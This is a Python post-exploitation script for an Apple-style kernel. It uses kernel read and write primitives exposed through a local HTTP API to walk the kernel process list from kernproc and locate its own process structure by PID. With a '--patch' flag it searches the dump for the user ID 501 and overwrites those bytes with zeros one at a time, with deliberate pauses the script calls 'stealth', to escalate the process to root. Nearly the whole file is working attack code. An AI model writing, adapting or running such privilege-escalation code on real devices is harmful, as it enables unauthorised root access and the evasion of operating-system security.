#!/usr/bin/env python3
"""Find our real proc by PID and optionally attempt UID patch.

Usage: python find_our_real_proc.py --pid 1234 [--api http://host:port] [--patch]

Performs a safe walk of the proc list starting from kernproc and compares p_pid
at several candidate offsets. On match dumps 256 bytes and searches for UID/GID
patterns and can perform a stealth per-byte zeroing if --patch is given.
"""
import os
import sys
import time
import struct
import argparse
import requests

KERNPROC_OFFSET = 0x96B928
TIMEOUT = 15.0
KREAD_RETRIES = 3
MAX_ITERS = 20000


def panic(msg):
    print(msg)
    sys.exit(1)


def api_get(base, path, params=None):
    url = base + path
    try:
        r = requests.get(url, params=params, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during API GET.')
        sys.exit(1)
    except requests.RequestException as e:
        print('API GET error:', e)
        return None


def api_post(base, path, json=None):
    url = base + path
    try:
        r = requests.post(url, json=json, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during API POST.')
        sys.exit(1)
    except requests.RequestException as e:
        print('API POST error:', e)
        return None


def kread(base, addr, size):
    last_exc = None
    for attempt in range(1, KREAD_RETRIES + 1):
        print(f'Читаю 0x{addr:016x} size={size} (attempt {attempt}/{KREAD_RETRIES})...')
        resp = api_post(base, '/api/v1/kread', json={'addr': hex(addr), 'size': size})
        if resp is None:
            last_exc = RuntimeError('kread: no response')
            time.sleep(0.5)
            continue
        # parse
        if 'value' in resp and isinstance(resp['value'], str):
            hexs = resp['value'][2:] if resp['value'].startswith('0x') else resp['value']
            if len(hexs) % 2:
                hexs = '0' + hexs
            raw = bytes.fromhex(hexs)
        elif 'data' in resp:
            d = resp['data']
            if isinstance(d, str):
                hexs = d[2:] if d.startswith('0x') else d
                raw = bytes.fromhex(hexs)
            elif isinstance(d, list):
                raw = bytes(d)
            else:
                last_exc = RuntimeError('kread: unsupported data format')
                time.sleep(0.5)
                continue
        else:
            last_exc = RuntimeError('kread: missing value/data')
            time.sleep(0.5)
            continue
        if len(raw) < size:
            raw = raw.ljust(size, b'\x00')
        return raw[:size]
    raise last_exc if last_exc is not None else RuntimeError('kread: failed')


def kwrite(base, addr, data_bytes):
    url = base + '/api/v1/kwrite'
    try:
        r = requests.post(url, json={'addr': hex(addr), 'data': data_bytes.hex()}, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print('[CRITICAL]  CRASHED: Connection lost during kwrite. Helper process likely killed by kernel.')
        sys.exit(1)
    except requests.RequestException as e:
        print('kwrite error:', e)
        return None


def to_u64_le(b):
    return int.from_bytes(b, 'little')


def to_u32_le(b):
    return int.from_bytes(b, 'little')


def hexdump(base_addr, data, width=16):
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hexs = ' '.join(f'{x:02x}' for x in chunk)
        print(f'Offset 0x{i:02X}: {hexs}')


def valid_kernel_ptr(x):
    try:
        return hex(x).startswith('0xffff')
    except Exception:
        return False


def find_proc(base, kernproc_slot, target_pid):
    # Read initial pointer from kernproc slot (at kernproc_slot)
    slot_ptr_bytes = kread(base, kernproc_slot, 8)
    slot_ptr = to_u64_le(slot_ptr_bytes)
    print(f'Kernproc slot pointer value: 0x{slot_ptr:016x}')
    if not valid_kernel_ptr(slot_ptr):
        print('Kernproc slot does not contain a valid kernel pointer; aborting traversal')
        return None

    cur = slot_ptr
    visited = set()
    it = 0
    while cur and it < MAX_ITERS:
        if cur in visited:
            print('Detected loop; aborting')
            return None
        visited.add(cur)
        if not valid_kernel_ptr(cur):
            print('Invalid pointer detected during traversal:', hex(cur))
            return None
        # try candidate pid offsets
        pid_offsets = [0x10, 0x18, 0x20, 0x28]
        for off in pid_offsets:
            try:
                pb = kread(base, cur + off, 4)
            except Exception as e:
                print('kread failed for pid at', hex(cur + off), e)
                continue
            pid_val = to_u32_le(pb)
            print(f'Read pid {pid_val} at {hex(cur + off)} (offset 0x{off:x})')
            if pid_val == target_pid:
                print(f'Found matching PID at proc ptr 0x{cur:016x} (pid offset 0x{off:x})')
                return cur, off
        # get next pointer from p_list at offset 0x0
        try:
            nxt_bytes = kread(base, cur + 0x0, 8)
            nxt = to_u64_le(nxt_bytes)
        except Exception as e:
            print('kread failed for next pointer at', hex(cur + 0x0), e)
            return None
        if not valid_kernel_ptr(nxt):
            print('Next pointer is not a kernel pointer; aborting traversal:', hex(nxt))
            return None
        cur = nxt
        it += 1
    print('Reached iteration limit without finding PID')
    return None


def attempt_stealth_zero(base, addr, length):
    # write zero per-byte with 0.5s pauses
    for i in range(length):
        a = addr + i
        print(f'Writing 0x00 to addr 0x{a:016x} (byte {i+1}/{length})')
        res = kwrite(base, a, b'\x00')
        print('kwrite response:', res)
        time.sleep(0.5)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--pid', type=int, required=True, help='Target PID to find')
    parser.add_argument('--api', dest='api', default=os.environ.get('API_BASE', 'http://127.0.0.1:8000'))
    parser.add_argument('--patch', action='store_true', help='Attempt stealth UID patch upon finding')
    args = parser.parse_args()

    base = args.api.rstrip('/')
    target_pid = args.pid

    print('Reading /api/v1/ds for kernel_base...')
    ds = api_get(base, '/api/v1/ds')
    if not ds or 'kernel_base' not in ds:
        panic('Failed to read kernel_base from /api/v1/ds')
    kernel_base = int(ds['kernel_base'], 0) if isinstance(ds['kernel_base'], str) else int(ds['kernel_base'])
    print(f'kernel_base = 0x{kernel_base:016x}')
    kernproc_addr = kernel_base + KERNPROC_OFFSET
    print(f'kernproc (slot) addr = 0x{kernproc_addr:016x}')

    res = find_proc(base, kernproc_addr, target_pid)
    if not res:
        panic('Could not find our proc in the list')
    proc_ptr, pid_offset = res

    print(f'REAL_OUR_PROC = 0x{proc_ptr:016x}')
    # dump 256 bytes
    print('Dumping first 256 bytes of found proc:')
    buf = kread(base, proc_ptr, 256)
    hexdump(proc_ptr, buf)

    # search for UID pattern in dump
    uid32 = b'\xf5\x01\x00\x00'
    uid64 = uid32 + uid32
    found = []
    idx = buf.find(uid32)
    while idx != -1:
        found.append(('UID32', idx))
        idx = buf.find(uid32, idx + 1)
    idx = buf.find(uid64)
    while idx != -1:
        found.append(('UID64', idx))
        idx = buf.find(uid64, idx + 1)

    if found:
        for name, off in found:
            addr = proc_ptr + off
            print(f'Found {name} at offset 0x{off:02x} (absolute 0x{addr:016x})')
        if args.patch:
            print('Attempting stealth zero at first found occurrence')
            name, off = found[0]
            addr = proc_ptr + off
            attempt_stealth_zero(base, addr, 4 if name == 'UID32' else 8)
            print('After patch, check /api/v1/ids:')
            ids = api_get(base, '/api/v1/ids')
            print('ids:', ids)
    else:
        print('No UID/GID patterns found in proc dump')


if __name__ == '__main__':
    main()
